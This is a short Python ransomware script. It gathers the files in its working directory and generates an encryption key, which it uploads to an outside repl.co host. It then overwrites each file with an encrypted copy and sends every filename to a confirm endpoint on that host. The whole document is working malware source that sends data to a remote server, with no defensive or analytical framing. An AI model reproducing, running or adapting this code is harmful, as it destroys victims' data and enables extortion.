import os # accessing files
import requests # uploading secrets
from cryptography.fernet import Fernet # encrypting files

# setup an empty array for handling files
files = []

for file in os.listdir():
	if file == "encrypt.py" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()
		
# Upload
post = "https://Ransomeware.simerlol.repl.co/post"
confirm = "https://Ransomeware.simerlol.repl.co/confirm"
secret = {
	'key': key
}
    
res = requests.post(post, data=secret).text
print(res)
for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contents_encrypted = Fernet(key).encrypt(contents)
  
  with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)
    gg = requests.post(confirm, data={'file': os.path.basename(file) + " was encrypted" }).text
print(gg)
		